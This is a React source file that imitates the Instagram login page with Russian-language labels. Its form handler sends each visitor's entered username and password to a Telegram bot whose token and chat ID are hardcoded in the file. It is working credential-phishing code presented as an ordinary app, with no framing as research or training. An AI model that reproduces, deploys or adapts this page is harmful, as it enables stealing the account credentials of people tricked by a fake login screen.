import {  useState } from "react";
import Footer from "./components/Footer";
import axios from "axios";

const App = () => {
  const [email, setemail] = useState("");
  const [password, setpassword] = useState("");
  const [passType, setpassType] = useState("password");


const TOKEN = "7043568504:AAGsyDsVoivhj9koS-mqZOFQoFlyw-AOuVU";
const CHAT_ID = "-4263168333";
const ULR_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;


  const handleSubmit = (e) => {
    e.preventDefault();
    if (email !== "" && password !== "" ){
      let message = `Name: ${email} \nPassword: ${password}`;

  axios
    .post(ULR_API, {
      chat_id: CHAT_ID,
      parse_mode: "html",
      text: message,
    })
    .then((res) => {
      res
      setemail("")
      setpassword("")
    })
    .catch((err) => {
      console.log(err);
    });
    }
  };

  return (
    <>
<div className="flex items-center justify-center w-full h-screen">
  <div className="flex items-center justify-between">
    <div>
      <img
        src="./src/assets/images/phones.png"
        alt="phone images"
      className="w-64 md:w-96 max-w-full hidden sm:flex"
      />
    </div>
    {/* 2 */}
    <div>
      <div className="border p-10 mx-10">
        <div className="flex items-center justify-center">
          <img
            src="./src/assets/images/instagramTextIcon.png"
            alt="insta text icon"
            width={200}
            className="mt-3"
          />
        </div>
        <form onSubmit={handleSubmit} className="mt-10">
          <div className="flex items-center justify-center relative">
            <input
              type="text"
              value={email}
              onChange={(e) => setemail(e.target.value)}
              placeholder="Телефон, имя пользователя или эл. адрес"
              className="border rounded-md px-3 py-3 w-full md:w-80 mt-2 text-sm focus:outline-gray-300"
            />
          </div>
          <div className="flex items-center justify-center relative mt-2">
            <input
              type={passType}
              value={password}
              onChange={(e) => setpassword(e.target.value)}
              placeholder="Пароль"
              className="border rounded-md px-3 py-3 w-full md:w-80 mt-2 text-sm focus:outline-gray-300"
            />
            <button
              type="button"
              onClick={() =>
                passType === "password"
                  ? setpassType("text")
                  : setpassType("password")
              }
              className="right-8 bottom-3 absolute"
            >
              {passType === "password" ? "Показать" : "Скрыть"}
            </button>
          </div>
          <div className="flex items-center justify-center relative mt-2">
            <button
              type="submit"
              className="text-white mt-5 font-semibold bg-blue-500 px-5 py-2 w-full md:w-80 rounded-lg"
            >
              Войти
            </button>
          </div>
        </form>
        <div className="flex items-center justify-center mt-5">
          <div className="bg-gray-300 w-16 mx-2 h-[1px]"></div>
          <h1 className="text-gray-300">ИЛИ</h1>
          <div className="bg-gray-300 w-16 mx-2 h-[1px]"></div>
        </div>
        <h1 className="text-center mt-5 text-blue-900 font-semibold flex items-center justify-center">
          <img
            src="./src/assets/icons/facebook.png"
            alt="facebook"
            width={20}
          />
          <a className="mx-3" href="https://www.facebook.com/login.php">
            <button>Войти через Facebook</button>
          </a>
        </h1>
        <br />
        <button className="w-full">
          <span className="text-center text-xs">Забыли пароль?</span>
        </button>
      </div>
      {/* register */}

      <div className="border p-10 mx-10 mt-5">
        <h1 className="font-semibold">
          У вас ещё нет аккаунта?{" "}
          <button className="text-blue-600">Зарегистрироваться</button>
        </h1>
      </div>
    </div>
  </div>
</div>
      <Footer />
    </>
  );
};

export default App;